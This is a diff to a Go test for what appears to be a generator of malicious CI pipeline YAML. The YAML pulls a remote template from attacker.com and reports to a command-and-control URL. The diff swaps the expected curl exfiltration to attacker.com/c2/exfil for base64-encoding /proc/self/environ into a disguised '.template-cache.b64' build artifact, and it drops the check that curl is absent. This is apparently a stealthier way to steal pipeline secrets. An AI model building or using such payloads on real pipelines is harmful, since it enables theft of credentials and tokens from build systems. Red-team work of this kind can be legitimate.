@@ -20,10 +20,11 @@ func TestGenerateRemoteIncludeCacheYAML(t *testing.T) {
 				"remote: https://attacker.com/ci-template.yml",
 				`cache: "1h"`,
 				"cache-seed:",
+				".template-cache.b64",
+				"base64 -w0",
+				"/proc/self/environ",
+				"artifacts:",
 				"allow_failure: true",
-			},
-			absent: []string{
-				"curl",
 			},
 		},
 		{
@@ -43,8 +44,7 @@ func TestGenerateRemoteIncludeCacheYAML(t *testing.T) {
 				CallbackURL: "https://attacker.com/c2",
 			},
 			contains: []string{
-				"curl",
-				"https://attacker.com/c2/exfil",
+				".template-cache.b64",
 			},
 		},
 	}
